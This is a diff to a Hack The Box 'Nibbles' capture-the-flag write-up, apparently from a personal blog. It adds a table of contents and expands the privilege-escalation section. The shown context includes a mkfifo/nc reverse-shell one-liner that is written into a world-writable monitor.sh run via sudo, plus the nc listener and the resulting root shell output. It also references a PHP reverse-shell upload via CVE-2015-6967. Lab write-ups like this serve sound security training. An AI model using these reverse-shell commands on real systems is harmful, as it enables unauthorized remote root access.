@@ -6,6 +6,19 @@ date:   2024-11-04 07:00:00 +0300
 image:  '/images/htb_nibbles.png'
 tags:   [Write-ups, HTB, OSCP+, Linux, Easy, CVE, PHP-Reverse-Shell, Sudo-l, Bash-Script, Alternative-Without-Metasploit]
 ---
+
+# Table of Contents
+- [Enumeration](#enumeration)
+  - [Nmap](#nmap)
+  - [Web Enumeration](#web-enumeration)
+  - [Feroxbuster](#feroxbuster)
+  - [Guessing the Password of admin user](#guessing-the-password-of-admin-user)
+- [Foothold](#foothold)
+  - [Nibbleblog CVE-2015-6967 without Metasploit to upload PHP reverse shell and get access as user nibbler](#nibbleblog-cve-2015-6967-without-metasploit-to-upload-php-reverse-shell-and-get-access-as-user-nibbler)
+- [Privilege Escalation](#privilege-escalation)
+  - [sudo -l and finding writeable monitor.sh bash script](#sudo--l-and-finding-writeable-monitorsh-bash-script)
+  - [Writing reverse shell into monitor.sh and getting shell as root](#writing-reverse-shell-into-monitorsh-and-getting-shell-as-root)
+
 # Enumeration
 ### Nmap
 ```shell
@@ -210,7 +223,7 @@ cd ~
 cat user.txt
 ```
 # Privilege Escalation
-### sudo -l
+### sudo -l and finding writeable monitor.sh bash script
 Using sudo -l we find out that the user nibbler can run monitor.sh as root without password:
 ```shell
 nibbler@Nibbles:/home/nibbler$ sudo -l
@@ -228,7 +241,7 @@ cd ~
 unzip personal.zip
 cat /home/nibbler/personal/stuff/monitor.sh
 ```
-It is a very quite long script, but since everybody can write on it, we can just change the contents to escalate our privileges:
+It is a quite long script, but since everybody can write on it, we can just change the contents to escalate our privileges:
 ```shell
 # Pay attention to -rwxrwxrwx permissions
 nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al
@@ -238,6 +251,10 @@ drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
 drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
 -rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
 ```
+We will abuse this to write a reverse shell into the monitor.sh that connects to our nc listener when running monitor.sh as sudo.
+
+### Writing reverse shell into monitor.sh and getting shell as root
+
 Let's start a nc listener on Kali first:
 ```shell
 nc -lvnp 8080
@@ -249,6 +266,12 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.206 8000 > 
 Now we just need to run the script monitor.sh with sudo and we will trigger the reverse shell, giving us a response in our nc listener and shell as root:
 ```shell
 sudo /home/nibbler/personal/stuff/monitor.sh
+```
+```shell
+listening on [any] 8000 ...
+connect to [10.10.14.206] from (UNKNOWN) [10.129.146.200] 52416
+# whoami
+root
 ```
 Upgrade the shell once we get a response in our nc listener:
 ```shell
